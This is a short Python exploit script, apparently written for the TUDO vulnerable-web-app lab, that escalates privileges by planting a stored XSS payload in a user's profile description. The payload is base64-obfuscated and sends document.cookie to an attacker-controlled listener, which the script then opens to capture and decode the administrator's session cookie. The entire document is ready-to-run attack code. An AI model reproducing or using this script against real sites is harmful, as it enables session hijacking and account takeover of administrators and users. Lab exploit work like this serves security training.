# TUDO Privilege Escalation #1 - "xss"
# William Moody
# December 22, 2025

import requests
import argparse
import socket
import base64

# Parse arguments
parser = argparse.ArgumentParser(description="Injects an XSS payload into user's description to steal admin cookie")
parser.add_argument("target",help="Target URL")
parser.add_argument("user",help="User")
parser.add_argument("password",help="Password")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="8001")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Log in as user
s = requests.Session()
r = s.post(
    f"{args.target}/login.php",
    data={"username":args.user,"password":args.password},
    allow_redirects=False
)
assert r.status_code == 302
print(f"[*] Logged in as {args.user}")

# Update description to XSS payload
b64 = base64.b64encode(f"fetch('//{args.lhost}:{args.lport}/'+btoa(document.cookie))".encode()).decode()
payload = f"<img src/onerror='eval(atob(`{b64}`))'/>"
r = s.post(
    f"{args.target}/profile.php",
    data={"description":payload}
)
assert "Success" in r.text
print(f"[*] Set {args.user}'s description to XSS payload")

# Listen for HTTP request
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((args.lhost,int(args.lport)))
s.listen()
print(f"[*] Listening on {args.lhost}:{args.lport}...")
print("[*] Waiting for admin to visit homepage...")

# Extract admin cookie from GET request
(sock_c, ip_c) = s.accept()
get_request = sock_c.recv(4096)
admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
print(f"[+] Got admin cookie: {admin_cookie}")

